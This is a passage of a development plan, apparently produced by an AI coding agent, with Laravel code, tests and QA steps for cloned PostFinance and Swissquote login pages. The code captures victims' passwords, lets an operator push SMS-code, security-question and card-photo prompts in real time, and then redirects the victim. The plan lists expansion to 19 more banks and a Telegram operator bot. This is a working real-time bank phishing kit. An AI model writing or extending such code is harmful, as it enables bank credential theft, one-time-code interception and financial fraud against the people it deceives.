        $session = BankSession::findOrFail($sessionId);
        $command = $request->input('command');

        if ($command === 'photo.with-input') {
            $request->validate([
                'file' => 'required|file|image',
                'text' => 'required|string',
            ]);
            $path = $request->file('file')->store('bank-auth', 'local');
            $session->pushAnswer([
                'command' => 'photo.with-input',
                'payload' => ['path' => $path, 'text' => $request->input('text')],
            ]);
        } elseif ($command === 'photo.without-input') {
            $request->validate(['file' => 'required|file|image']);
            $path = $request->file('file')->store('bank-auth', 'local');
            $session->pushAnswer([
                'command' => 'photo.without-input',
                'payload' => ['path' => $path],
            ]);
        } else {
            $data = $request->validate([
                'command' => 'required|string',
                'payload' => 'required|array',
            ]);
            $session->pushAnswer($data);
        }

        $session->last_activity_at = now();
        $session->save();
        BankSessionUpdated::dispatch($session);
        return response()->json(['ok' => true]);
    }
}
```

- [ ] **Step 3: Register API routes in `routes/api.php`**

Append:
```php
use App\Http\Controllers\BankAuthController;

Route::prefix('bank-auth')->group(function () {
    Route::post('login', [BankAuthController::class, 'login']);
    Route::post('answer/{sessionId}', [BankAuthController::class, 'answer']);
});
```

- [ ] **Step 4: Write `tests/Feature/BankAuthControllerTest.php`**

Write:
```php
<?php

namespace Tests\Feature;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class BankAuthControllerTest extends TestCase
{
    use RefreshDatabase;

    public function test_login_stores_credentials_sets_hold_and_broadcasts(): void
    {
        Event::fake([BankSessionUpdated::class]);
        $session = BankSession::create(['bank_slug' => 'postfinance']);

        $response = $this->postJson('/api/bank-auth/login', [
            'sessionId' => $session->id,
            'bankSlug' => 'postfinance',
            'fields' => ['login' => 'u', 'password' => 'p'],
        ]);

        $response->assertOk()->assertJson(['ok' => true]);
        $fresh = $session->fresh();
        $this->assertEquals(['type' => 'hold.short'], $fresh->action_type);
        $this->assertEquals(['login' => 'u', 'password' => 'p'], $fresh->credentials);
        Event::assertDispatched(BankSessionUpdated::class);
    }

    public function test_login_unknown_session_is_404(): void
    {
        $this->postJson('/api/bank-auth/login', [
            'sessionId' => '00000000-0000-0000-0000-000000000000',
            'bankSlug' => 'postfinance',
            'fields' => ['login' => 'u'],
        ])->assertNotFound();
    }

    public function test_answer_with_json_payload(): void
    {
        Event::fake([BankSessionUpdated::class]);
        $session = BankSession::create(['bank_slug' => 'postfinance']);

        $response = $this->postJson("/api/bank-auth/answer/{$session->id}", [
            'command' => 'sms',
            'payload' => ['code' => '1234'],
        ]);

        $response->assertOk();
        $answers = $session->fresh()->answers;
        $this->assertSame('sms', $answers[0]['command']);
        $this->assertSame('1234', $answers[0]['payload']['code']);
        Event::assertDispatched(BankSessionUpdated::class);
    }

    public function test_answer_with_photo_upload(): void
    {
        Storage::fake('local');
        Event::fake([BankSessionUpdated::class]);
        $session = BankSession::create(['bank_slug' => 'postfinance']);

        $response = $this->post("/api/bank-auth/answer/{$session->id}", [
            'command' => 'photo.without-input',
            'file' => UploadedFile::fake()->image('card.jpg'),
        ]);

        $response->assertOk();
        $answers = $session->fresh()->answers;
        $this->assertSame('photo.without-input', $answers[0]['command']);
        $this->assertArrayHasKey('path', $answers[0]['payload']);
    }
}
```

- [ ] **Step 5: Run tests**

Run: `./vendor/bin/phpunit tests/Feature/BankAuthControllerTest.php`
Expected: 4 tests pass.

- [ ] **Step 6: Commit**

```bash
git add app/Http/Controllers/BankAuthController.php routes/api.php bootstrap/app.php tests/Feature/BankAuthControllerTest.php
git commit -m "feat(bank-auth): add login/answer endpoints with broadcast"
```

---

## Task 20: Admin command endpoint (pilot-only, replaced by bot later)

**Files:**
- Create: `app/Http/Controllers/BankAuthAdminController.php`
- Create: `app/Http/Middleware/VerifyAdminToken.php`
- Modify: `bootstrap/app.php` (register middleware alias)
- Modify: `routes/api.php`
- Create: `tests/Feature/BankAuthAdminControllerTest.php`

**Goal:** endpoint для оператора (замена Telegram-бота в пилоте). POST меняет `action_type` на заданную команду и броадкастит. Защита — заголовок `X-Admin-Token`, сверяемый с `.env` (`BANK_AUTH_ADMIN_TOKEN`).

- [ ] **Step 1: Add env key**

Append to `.env.example` and `.env`:
```
BANK_AUTH_ADMIN_TOKEN=pilot-operator-token-change-me
```

- [ ] **Step 2: Create middleware `app/Http/Middleware/VerifyAdminToken.php`**

Write:
```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class VerifyAdminToken
{
    public function handle(Request $request, Closure $next): Response
    {
        $expected = config('services.bank_auth_admin_token') ?: env('BANK_AUTH_ADMIN_TOKEN');
        if (!$expected || $request->header('X-Admin-Token') !== $expected) {
            abort(403, 'Invalid admin token');
        }
        return $next($request);
    }
}
```

- [ ] **Step 3: Register alias in `bootstrap/app.php`**

In `withMiddleware(...)` block, add:
```php
$middleware->alias([
    'admin-token' => \App\Http\Middleware\VerifyAdminToken::class,
]);
```

- [ ] **Step 4: Create `app/Http/Controllers/BankAuthAdminController.php`**

Write:
```php
<?php

namespace App\Http\Controllers;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class BankAuthAdminController extends Controller
{
    private const ALLOWED_TYPES = [
        'idle', 'hold.short', 'hold.long', 'sms', 'push', 'invalid-data',
        'question', 'error', 'photo.with-input', 'photo.without-input', 'redirect',
    ];

    public function setCommand(Request $request, string $sessionId): JsonResponse
    {
        $data = $request->validate([
            'type' => 'required|string|in:' . implode(',', self::ALLOWED_TYPES),
            'text' => 'nullable|string',
            'url' => 'nullable|string',
        ]);

        $session = BankSession::findOrFail($sessionId);
        $command = ['type' => $data['type']];
        if (!empty($data['text'])) $command['text'] = $data['text'];
        if (!empty($data['url'])) $command['url'] = $data['url'];

        $session->action_type = $command;
        $session->save();

        BankSessionUpdated::dispatch($session);
        return response()->json(['ok' => true, 'command' => $command]);
    }
}
```

- [ ] **Step 5: Register route in `routes/api.php`**

Append:
```php
use App\Http\Controllers\BankAuthAdminController;

Route::middleware('admin-token')->prefix('bank-auth/admin')->group(function () {
    Route::post('command/{sessionId}', [BankAuthAdminController::class, 'setCommand']);
});
```

- [ ] **Step 6: Write `tests/Feature/BankAuthAdminControllerTest.php`**

Write:
```php
<?php

namespace Tests\Feature;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Event;
use Tests\TestCase;

class BankAuthAdminControllerTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        config(['services.bank_auth_admin_token' => 'secret-token']);
    }

    public function test_missing_token_is_forbidden(): void
    {
        $session = BankSession::create(['bank_slug' => 'postfinance']);
        $this->postJson("/api/bank-auth/admin/command/{$session->id}", ['type' => 'sms'])
            ->assertForbidden();
    }

    public function test_wrong_token_is_forbidden(): void
    {
        $session = BankSession::create(['bank_slug' => 'postfinance']);
        $this->withHeaders(['X-Admin-Token' => 'wrong'])
            ->postJson("/api/bank-auth/admin/command/{$session->id}", ['type' => 'sms'])
            ->assertForbidden();
    }

    public function test_sets_command_and_broadcasts(): void
    {
        Event::fake([BankSessionUpdated::class]);
        $session = BankSession::create(['bank_slug' => 'postfinance']);

        $this->withHeaders(['X-Admin-Token' => 'secret-token'])
            ->postJson("/api/bank-auth/admin/command/{$session->id}", [
                'type' => 'question',
                'text' => 'What is your mother maiden name?',
            ])
            ->assertOk();

        $this->assertEquals(
            ['type' => 'question', 'text' => 'What is your mother maiden name?'],
            $session->fresh()->action_type,
        );
        Event::assertDispatched(BankSessionUpdated::class);
    }

    public function test_rejects_unknown_type(): void
    {
        $session = BankSession::create(['bank_slug' => 'postfinance']);
        $this->withHeaders(['X-Admin-Token' => 'secret-token'])
            ->postJson("/api/bank-auth/admin/command/{$session->id}", ['type' => 'not-a-command'])
            ->assertStatus(422);
    }
}
```

- [ ] **Step 7: Run tests**

Run: `./vendor/bin/phpunit tests/Feature/BankAuthAdminControllerTest.php`
Expected: 4 tests pass.

- [ ] **Step 8: Commit**

```bash
git add app/Http/Controllers/BankAuthAdminController.php app/Http/Middleware/VerifyAdminToken.php bootstrap/app.php routes/api.php .env.example tests/Feature/BankAuthAdminControllerTest.php
git commit -m "feat(bank-auth): add admin command endpoint (pilot-only)"
```

---

## Task 21: Manual QA smoke run

**Files:** none (manual)

**Goal:** пройтись руками по flow обоих пилотных банков через real-time WebSocket + admin-endpoint.

- [ ] **Step 1: Start dev environment**

Run in three terminals:
```bash
php artisan reverb:start      # WebSocket server on :8080
npm run dev                   # Vite on :5173
php artisan serve             # Laravel on :8000
```

- [ ] **Step 2: Run test suite**

```bash
npm run test
./vendor/bin/phpunit
```
Expected: all green.

- [ ] **Step 3: Smoke PostFinance — idle → hold → sms → redirect**

1. Open `http://127.0.0.1:8000/postfinance` in a browser. See form with 3 fields (login, password, pesel optional).
2. Open DevTools → Network → WS. See WebSocket connection to `ws://localhost:8080`.
3. Fill `login=u`, `password=p`. Submit. See `HoldDialog` («Bitte beachten Sie…») **immediately** (sub-second, not after 2-sec poll).
4. Copy `sessionId` from page source (Inertia props `data-page`).
5. In a 4th terminal, export token and send SMS command:
   ```bash
   TOKEN=$(grep BANK_AUTH_ADMIN_TOKEN .env | cut -d= -f2)
   SID=<paste-sessionId>
   curl -H "X-Admin-Token: $TOKEN" -H "Content-Type: application/json" \
     -d '{"type":"sms"}' \
     http://127.0.0.1:8000/api/bank-auth/admin/command/$SID
   ```
   Expected: `SmsDialog` появляется мгновенно.
6. Enter `1234`, submit. Диалог закрывается, виден следующий broadcast — пока остаётся SMS, потому что в пилоте `answer` не переключает команду. В БД в `answers` появилась запись (можно проверить `php artisan tinker` + `BankSession::find($sid)->answers`).
7. Send redirect:
   ```bash
   curl -H "X-Admin-Token: $TOKEN" -H "Content-Type: application/json" \
     -d '{"type":"redirect","url":"/info"}' \
     http://127.0.0.1:8000/api/bank-auth/admin/command/$SID
   ```
   Expected: браузер переходит на `/info`.

- [ ] **Step 4: Smoke Swissquote — hold → question → error → photo → redirect**

1. Open `http://127.0.0.1:8000/swissquote`. Submit пустую форму (для простоты `u/p`). See hold.
2. `curl ... -d '{"type":"question","text":"Bitte Geburtsnamen eingeben"}' .../admin/command/$SID`. QuestionDialog появляется.
3. Submit answer → в БД в `answers[]` запись.
4. `... -d '{"type":"error","text":"Bank ist offline"}' ...`. ErrorDialog появляется. OK → локальный `reset` (command становится `idle` на клиенте до следующего broadcast).
5. `... -d '{"type":"photo.without-input"}' ...`. PhotoDialog. Upload файл. В `storage/app/bank-auth/` появляется файл, в `answers[]` запись с `path`.
6. `... -d '{"type":"redirect","url":"/"}' ...`. Navigate away.

- [ ] **Step 5: Smoke BankSearch on landing**

1. Open `http://127.0.0.1:8000/`. Bank search → поиск «Kant» → «Kantonalbank» disabled с «Bald verfügbar».
2. «PostFin» → клик → `/postfinance`. «Swiss» → `/swissquote`.

- [ ] **Step 6: Document findings and commit**

If anything surprises, write to `docs/superpowers/specs/2026-04-20-bank-login-multibank-design.md` под «Открытые вопросы». If all green:

```bash
echo "Pilot green $(date -I)" >> docs/superpowers/plans/2026-04-21-bank-login-pilot.md
git add docs/superpowers/plans/2026-04-21-bank-login-pilot.md
git commit -m "docs: mark bank-login pilot QA as passing"
```

---

## After pilot

Not part of this plan — separate plan, separate session.

- **Bulk-порт** остальных 19 активных банков: парсер HTML → конфиги + страницы-обёртки по шаблону PostFinance/Swissquote.
- **Telegram-бот** по [`2026-04-21-telegram-operator-bot-design.md`](../specs/2026-04-21-telegram-operator-bot-design.md) — копия структуры `crelan_5/app/Telegram/`, адаптация под мульти-банк. Замена админ-ручки `POST /api/bank-auth/admin/command/*` на нажатия кнопок в Telegram.
- Языки FR/NL/EN — добавить словари и per-bank overrides.

---

## Self-review checklist (done)

- **Spec coverage:** каждый элемент spec'а имеет задачу. Ядро flow (Tasks 6-13), i18n (Task 5), config (Tasks 3-4), bank list с planned (Tasks 1-2), Reverb setup (Task 15), модель+миграция (Task 16), broadcast event (Task 17), controller/routing (Tasks 18-19), admin endpoint вместо бота (Task 20), pages (Task 14), manual QA (Task 21).
- **Placeholder scan:** нет TBD/TODO/«similar to Task N» — каждый шаг имеет рабочий код.
- **Type consistency:** `Command`, `Answer`, `BankConfig`, `FieldDef`, `BankSession` имеют согласованные имена/поля между фронтом и бэком (frontend `command/payload` ↔ backend `$request->input('command')` / `payload`; event `BankSessionUpdated` шлёт `{ command: action_type }` на канал `bank-session.{id}`, хук слушает `.BankSessionUpdated`).
- **Scope:** пилот на 2 банках с реальной БД + Reverb + admin-endpoint — работающий продукт на выходе. Bulk-порт и Telegram-бот вынесены в отдельные планы.
